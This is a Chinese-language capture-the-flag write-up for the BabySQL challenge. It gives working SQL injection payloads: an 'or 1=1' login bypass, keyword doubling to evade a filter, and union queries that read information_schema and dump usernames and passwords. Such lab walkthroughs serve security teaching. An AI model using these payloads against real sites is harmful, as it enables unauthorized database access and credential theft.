# [极客大挑战 2019]BabySQL

## Tag

SQL 注入

***

## Writeup

输入万能密码 `admin' or 1=1;#` 后发现：

![image-20260128201522126](../../../../assets/image-20260128201522126.png)

可以看到 OR 字段被过滤掉了，尝试双写，用 `admin' oorr 1=1;#`：

![image-20260128201604576](../../../../assets/image-20260128201604576.png)

后面就跟 [[极客大挑战 2019]LoveSQL](./[极客大挑战 2019]LoveSQL/) 一样了，注意它对 from, where, union, select 等字段均有过滤，因此使用 `1' ununionion selselectect 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()#` 可以得到表名：

![image-20260128202229125](../../../../assets/image-20260128202229125.png)

使用 `1' ununionion selselectect 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#`：

![image-20260128202529510](../../../../assets/image-20260128202529510.png)

再使用 `1' ununionion selselectect 1,database(),group_concat(id,username,passwoorrd) frfromom b4bsql#` 即可得到 Flag：

![image-20260128202707947](../../../../assets/image-20260128202707947.png)